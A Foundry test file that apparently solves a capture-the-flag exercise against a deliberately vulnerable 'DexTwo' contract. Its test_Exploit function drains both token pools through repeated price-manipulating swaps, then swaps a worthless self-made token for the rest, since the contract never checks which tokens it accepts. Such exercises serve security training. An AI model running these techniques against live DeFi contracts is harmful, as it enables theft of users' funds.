// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/DexTwo.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract dex2Test is Test {
    SwappableTokenTwo public swappabletoken1;
    SwappableTokenTwo public swappabletoken2;
    
    DexTwo public dex2;
    address attacker = makeAddr("attacker");

    function setUp() public {
        dex2 = new DexTwo();
        swappabletoken1 = new SwappableTokenTwo(address(dex2),"Swap","SW", 110);
        vm.label(address(swappabletoken1), "Token 1");
        swappabletoken2 = new SwappableTokenTwo(address(dex2),"Swap","SW", 110);
        vm.label(address(swappabletoken2), "Token 2");
        dex2.setTokens(address(swappabletoken1), address(swappabletoken2));

        dex2.approve(address(dex2), 100);
        dex2.add_liquidity(address(swappabletoken1), 100);
        dex2.add_liquidity(address(swappabletoken2), 100);

        vm.label(attacker, "Attacker");
        // Set up the attacker with some initial balance
        swappabletoken1.transfer(attacker, 10);
        swappabletoken2.transfer(attacker, 10);

        //DO_NOT_TOUCH
    }

    function test_Exploit() public {
       //Execute the attacker here.

        vm.startPrank(attacker);
        dex2.approve(address(dex2), type(uint256).max);

        while (swappabletoken1.balanceOf(address(dex2)) > 0) {
            if(swappabletoken1.balanceOf(attacker) > 0) {
                uint256 attackerBal = swappabletoken1.balanceOf(attacker);
                uint256 leftIndex2 = swappabletoken1.balanceOf(address(dex2));
                uint256 swapAmt = attackerBal > leftIndex2 ? leftIndex2 : attackerBal;
                dex2.swap(address(swappabletoken1), address(swappabletoken2), swapAmt);
            } else { uint256 attackerBal = swappabletoken2.balanceOf(attacker);
                uint256 leftIndex2 = swappabletoken2.balanceOf(address(dex2));
                uint256 swapAmt = attackerBal > leftIndex2 ? leftIndex2 : attackerBal;
                dex2.swap(address(swappabletoken2), address(swappabletoken1), swapAmt);
            }
        }

        SwappableTokenTwo swappabletoken3 = new SwappableTokenTwo(address(dex2), "Swap3", "SW3", 100);
        swappabletoken3.transfer(address(dex2), 1);
        swappabletoken3.approve(address(dex2), type(uint256).max);
        dex2.swap(address(swappabletoken3), address(swappabletoken2), swappabletoken3.balanceOf(address(dex2)));

        console.log("Attacker balance of token1: ", swappabletoken1.balanceOf(attacker));
        console.log("Attacker balance of token2: ", swappabletoken2.balanceOf(attacker));
        console.log("Dex balance of token1: ", swappabletoken1.balanceOf(address(dex2)));
        console.log("Dex balance of token2: ", swappabletoken2.balanceOf(address(dex2)));

        vm.stopPrank();


        is_Drained();
    }

    function is_Drained () internal view{
        require(swappabletoken1.balanceOf(address(dex2)) == 0);
        require(swappabletoken2.balanceOf(address(dex2)) == 0);
    }

}
